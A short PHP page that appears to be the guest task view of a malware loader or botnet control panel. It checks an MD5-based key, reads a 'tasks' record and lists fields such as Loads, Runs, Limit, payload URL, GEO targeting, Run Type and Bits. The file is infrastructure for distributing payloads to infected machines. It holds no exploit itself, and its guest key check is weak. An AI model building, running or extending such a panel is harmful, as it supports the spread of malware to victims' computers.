<?php

require_once "./inc/cfg.php";
require_once "./inc/funcs.php";
require_once "./inc/style.php";

$id = $_GET["id"];
$key = $_GET["key"];

if (!empty($id) && !empty($key)){
	mysql_init();
	$id = intval(mysql_real_escape_string($id));
	$key = mysql_real_escape_string($key);
	$r = mysql_query("SELECT * FROM tasks WHERE id=$id");
	if (!$r) die(include "404.php");
	$v = mysql_fetch_assoc($r);
	if (!$v) die(include "404.php");
	$date = date("d.m.Y H:i:s",$v["time"]);
	if ($key !== md5("{$config["guest"]}{$date}")) die(include "404.php");
} else die(include "404.php");

?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title></title>
<style>
*{
	margin:0;
	padding:0;
}

body, html {
	font:13px Tahoma,Arial;
}

#task th{
	text-transform:uppercase;
	padding:3px;
	background-color:#a7abb0;
}

#task td{
	padding:3px;
	text-transform:uppercase;
	font-size:11px;
	vertical-align:middle;
}

#task img{
	padding:3px;
	vertical-align:middle;
}	
</style>
</head>
<body>
<?php
echo "
<table id=\"task\">
	<tr>
		<th align=\"center\">Size</th>
		<th align=\"center\">Date</th>
		<th align=\"center\">Loads</th>
		<th align=\"center\">Runs</th>
		<th align=\"center\">Limit</th>
		<th align=\"center\">URL</th>
		<th align=\"center\">GEO</th>
		<th align=\"center\">Run Type</th>
		<th align=\"center\">Bits</th>
	</tr>".allgexe($id)."</table>";
?>
</body>
</html>